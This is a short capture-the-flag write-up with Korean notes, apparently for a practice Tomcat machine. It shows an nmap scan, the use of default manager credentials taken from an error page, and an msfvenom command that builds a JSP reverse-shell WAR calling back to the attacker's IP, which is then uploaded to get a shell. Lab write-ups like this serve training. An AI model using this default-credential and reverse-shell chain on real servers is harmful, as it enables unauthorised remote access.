
| [[#Which TCP port is open on the remote host?]] |     |
| ----------------------------------------------- | --- |
|                                                 |     |


## Nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -p- -Pn --min-rate 5000 10.129.136.9 -oN 10.129.136.9.log 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-27 11:08 KST
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.129.136.9
Host is up (0.25s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.15 seconds
```



10.129.136.9:8080 웹사이트 접근

![[Pasted image 20260127133856.png]]


Manager App 클릭시 로그인 요청
![[Pasted image 20260127133930.png]]

Cancel 선택 후 401 에러 페이지 내 기본 계정 패스워드 확인
![[Pasted image 20260127134004.png]]

shell.war 파일 생성
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.161 LPORT=4444 -f war > shell.war
```
![[Pasted image 20260127134044.png]]

shell.war 업로드
![[Pasted image 20260127134124.png]]

업로드 후 10.129.136.9:8080/shell 접근
![[Pasted image 20260127134306.png]]

flag 획득
![[Pasted image 20260127134320.png]]


